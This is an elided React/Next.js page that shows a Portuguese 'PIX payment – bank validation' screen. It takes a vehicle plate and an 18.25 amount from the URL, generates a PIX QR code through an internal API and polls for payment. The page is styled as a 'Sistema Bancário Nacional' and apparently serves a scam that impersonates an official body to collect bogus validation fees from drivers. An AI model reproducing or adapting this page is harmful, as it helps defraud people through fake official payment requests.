...
function PixValidacaoContent() {
  const searchParams = useSearchParams()
  const router = useRouter()
  const placa = searchParams.get("placa") || ""
  const valor = parseFloat(searchParams.get("valor") || "18.25")
  ...
  const generatePix = useCallback(async () => {
    try {
      ...
      const response = await fetch("/api/pix-validacao", {
        method: "POST",
        headers: {
  ...
  useEffect(() => {
    ...
    const checkStatus = async () => {
      try {
        const response = await fetch(`/api/pix-validacao?txid=${pixData.txid}`)
        const data = await response.json()
    ...
    return (
      <div className="min-h-screen bg-zinc-100 flex items-center justify-center">
        <div className="text-center">
          <Loader2 className="h-12 w-12 animate-spin text-[#1a3a5c] mx-auto" />
          <p className="mt-4 text-[#1a3a5c] font-medium">Carregando...</p>
        </div>
      </div>
    )
  }
  ...
  return (
    <div className="min-h-screen bg-zinc-100" style={{ fontFamily: "Verdana, sans-serif" }}>
      {/* Header */}
      <header className="bg-[#1a3a5c] py-4">
      ...
      <main className="max-w-4xl mx-auto px-4 py-6">
        {/* Title Section */}
        <div className="bg-[#1a3a5c] text-white p-4 mb-0 rounded-t-lg">
          <div className="flex items-center gap-3">
            <QrCode className="w-8 h-8 text-amber-400" />
            <div>
              <h1 className="text-xl md:text-2xl font-bold">Pagamento via PIX</h1>
              <p className="text-sm text-gray-300">Validação Bancária</p>
            </div>
          </div>
        </div>

        {/* Yellow Accent Bar */}
        <div className="bg-amber-400 h-2 mb-0"></div>
              ...
              <div className="bg-red-50 border-l-4 border-red-500 p-6">
                <div className="flex items-start gap-3">
                  ...
                  <div>
                    ...
                    <Button
                      onClick={generatePix}
                      className="bg-[#1a3a5c] hover:bg-[#15304d] text-white"
                    >
                      Tentar novamente
                    </Button>
                  </div>
            ...
            <div className="p-6">
              <div className="bg-green-50 border-l-4 border-green-500 p-8 text-center">
                ...
                <p className="text-green-700 mb-6">
                  Sua validação bancária foi concluída com sucesso. Redirecionando...
                </p>
              </div>
            </div>
          )}
              ...
              <div className="bg-[#e9ecef] p-4 border-b border-gray-200">
                <div className="flex items-center justify-between">
                  <div>
                    ...
                    <p className="font-bold text-[#1a3a5c]">Sistema Bancário Nacional</p>
                  </div>
                ...
                <div className="flex flex-col lg:flex-row gap-8">
                  ...
                  <div className="flex-1 flex flex-col items-center">
                    <div className="border-2 border-[#1a3a5c] p-1 mb-4">
                      <div className="border border-amber-400 p-3 bg-white">
                        <img
                  ...
                  <div className="flex-1">
                      ...
                      <Button
                        ...
                        className={`w-full font-bold py-3 ${
                          copied
                            ...
                            : "bg-amber-400 hover:bg-amber-500 text-[#1a3a5c]"
                        }`}
                      >
                        {copied ? (
                          <>
                    ...
                    {/* Status */}
                    <div className="bg-[#fff3cd] border-l-4 border-amber-400 p-4 mb-4">
...
export default function PixValidacaoPage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen bg-zinc-100 flex items-center justify-center">
